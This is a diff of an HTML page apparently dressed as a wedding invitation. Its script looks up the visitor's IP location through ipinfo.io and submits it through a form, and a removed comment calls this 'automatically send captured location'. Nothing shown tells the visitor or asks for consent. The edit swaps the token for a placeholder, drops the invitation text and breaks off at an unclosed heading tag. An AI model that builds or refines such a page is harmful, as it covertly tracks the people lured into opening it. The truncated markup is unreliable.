@@ -19,17 +19,15 @@
       form.submit();
     }
 
-    fetch('https://ipinfo.io/json?token=123456789abcdef')
+    // Replace 'YOUR_TOKEN_HERE' with your actual IPinfo token
+    fetch('https://ipinfo.io/json?token=YOUR_ACTUAL_TOKEN_HERE')
       .then(response => response.json())
       .then(data => {
         console.log("User location data:", data);
-        sendLocation(data); // Automatically send captured location
+        sendLocation(data); // Send captured location info
       })
-      .catch(error => console.error(error));
+      .catch(error => console.error('Error:', error));
   </script>
 </head>
 <body>
-  <h1>You're Invited!</h1>
-  <p>Please join us for the celebration of our marriage.</p>
-</body>
-</html>
+  <h1>
